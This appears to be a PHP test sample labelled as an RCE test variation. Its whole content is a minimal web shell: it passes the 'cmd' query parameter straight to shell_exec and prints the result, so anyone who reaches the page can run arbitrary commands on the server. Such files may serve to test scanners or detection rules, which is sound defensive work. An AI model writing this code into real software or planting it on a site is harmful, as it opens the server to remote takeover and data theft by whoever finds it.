<?php
// RCE test variation #1463
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>